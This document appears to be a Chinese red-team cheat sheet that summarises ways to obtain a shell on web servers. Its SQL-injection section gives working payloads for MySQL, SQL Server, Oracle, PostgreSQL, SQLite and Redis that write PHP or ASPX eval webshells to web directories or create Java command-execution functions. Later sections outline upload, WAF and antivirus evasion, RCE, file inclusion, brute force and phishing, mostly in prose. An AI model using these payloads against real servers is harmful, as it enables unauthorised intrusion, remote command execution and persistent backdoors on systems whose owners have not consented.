# GetShell思路总结

无论是常规渗透测试还是攻防对抗，亦或黑灰产对抗、APT攻击，getshell 是一个从内到外的里程碑成果。我们接下来总结下常见拿shell的一些思路和方法。

## 注入getshell

一般前提条件：有权限、知道路径

> 当然注入不一定都能拿到webshell，比如站库分离。但不管是否站库分离，只要权限够能够执行系统命令，反弹cmdshell 也是不错的选择。
>
>比如sa权限结合xp_cmdshell 存储过程，直接执行powershell,反弹到cobalt strike …

### mysql

举例

    select 0x3c3f706870206576616c28245f504f53545b615d293b3f3e into outfile '/var/www/html/1.php'
    
> `<?php eval($_POST[a]);?>` 进行十六进制编码后则为3c3f706870206576616c28245f504f53545b615d293b3f3e
 
### Sql server

举例

存储过程xp_cmdshell

    exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > D:\\WWW\\2333.aspx' ;--
 
### Oracle

> oracle成功率受限于与数据库版本以及注入点

举例

1、创建JAVA包

    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
2、JAVA权限

    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual;
    
3、创建函数

    select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
    
URL执行

    id=602'||utl_inadd.get_host_name((select LinxRUNCMD('cmd /c dir d:/') from dual))--
 
### postgresql

举例

    COPY (select '<?php phpinfo();?>') to '/tmp/1.php';
 
### sqlite3

举例

    ;attach database 'D:\\www\\008.php' as tt;create TABLE tt.exp (dataz text) ; insert INTO tt.exp (dataz) VALUES (x'3c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e');
 
### redis

举例

    %0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml2F%0D%0Aconfig%20set%20dbfilename%20shell%2Ephp%0D%0Aset%20x%2022%3C%3Fphp%20phpinfo%28%29%3B%%203F%3E%22%0D%0Asave%0D%0A

## 上传 getWebShell

前台上传点或者后台（通过口令进入、或者XSS到后台、逻辑漏洞越权）上传点

类似直接的上传漏洞就可以getshell的漏洞，例如IIS PUT上传、Tomcat PUT 上传

编辑器（FCK、editor、CKedtor…）存在上传漏洞可以getshell。

这个期间可能涉及逻辑绕过、WAF对抗、杀软绕过、执行层，主要解决四点：

* 代码或逻辑问题，可以上传脚本文件
* 躲过WAF对脚本文件及上传内容的校验
* 解决落地杀
* 执行过程，躲过流量监控或者系统层监控

同样RCE 也需要关注以上后几点，因为前面的入口场景不同。

## RCE getshell

RCE是统称，包括远程代码执行、远程命令执行。

> 当然这两个概念还是有意思的，比如struts2漏洞有的叫命令执行有的叫代码执行。这都不重要。一般根据触发点来命名。

Java系的OGNL 表达式注入、EL注入、反序列化

PHP系列的eval 类、伪协议类 代码执行、system类命令执行

当然反序列化漏洞基本上编程语言都有，除了漏洞利用getshell，用作免杀后门webshell也是一个不错的思路推荐。

正由于代码执行的部分结果是执行了系统命令，在命令执行的加持下，可以直接拿到应用或系统的shell，也是正统策略。

## 包含getWebShell

文件包含，常见JSP、ASPx、PHP 都有包含，但主要还是PHP的包含好用。

因为可以包含任意路径的任意后缀，能控制include类函数的输入结合系统特性文件或者上传的文件结合，可以拿到webshell。

JSP包含，默认情况下动态包含WEB路径下的JSP文件（静态包含可以包含任意后缀的文本文件，但不支持变量动态赋值）

## 系统层getcmdshell

暴力破解的艺术，毕竟锤子开锁和钥匙开锁在入侵角度结果是一样的。

常规协议：SSH、RDP、SMB、VPC、Redis 等中间件类

通过数据库执行语句获得了系统shell，对于获取权限，比sql注入更直接。

设备层：VPN、防火墙，搞定这种边界设备，单车变摩托。

## 钓鱼 getCmdShell

发送钓鱼邮件，捆绑的马，访问即加载、点击即执行类的马。

这一类攻击一般结合社工，例如借用IT管理员发送或某领导的账号去发送

（所以这时候的邮箱的0day就灰常重要了，当然如果在邮箱内部找到类似VPN或者密码表类，也不需要这么麻烦，一把梭…），

可信度就高很多。对于红队来讲，钓的鱼儿还是以IT部门系列为主，普通办公区的主机权限还需要做更多的工作。
